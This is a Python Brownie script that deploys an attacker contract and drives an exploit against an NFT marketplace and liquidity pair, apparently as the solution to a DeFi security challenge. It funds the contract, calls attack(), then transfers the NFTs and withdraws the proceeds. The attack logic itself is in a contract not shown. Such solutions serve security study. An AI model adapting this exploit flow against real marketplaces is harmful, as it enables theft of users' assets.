from brownie import AttackerContract

from scripts.deploy import setup_buyer_contract


def setup_attacker_contract(pair_address, weth_address, marketplace_address, nft_address, attacker_account):
    attacker_contract = AttackerContract.deploy(
        pair_address, weth_address, marketplace_address, nft_address, {'from': attacker_account})

    return attacker_contract


def exploit(pair_address, weth_address, nft_market_address, nft_address, attacker_account, buyer_account):
    attacker_contract = setup_attacker_contract(
        pair_address, weth_address, nft_market_address, nft_address, attacker_account)
    attacker_account.transfer(attacker_contract, '0.5 ether')
    buyer_contract = setup_buyer_contract(
        attacker_contract, nft_address, buyer_account)
    attacker_contract.setNFTBuyer(buyer_contract, {'from': attacker_account})
    tx = attacker_contract.attack({'from': attacker_account})
    attacker_contract.transferNFTs({'from': attacker_account})
    attacker_contract.withdraw({'from': attacker_account})

    return buyer_contract
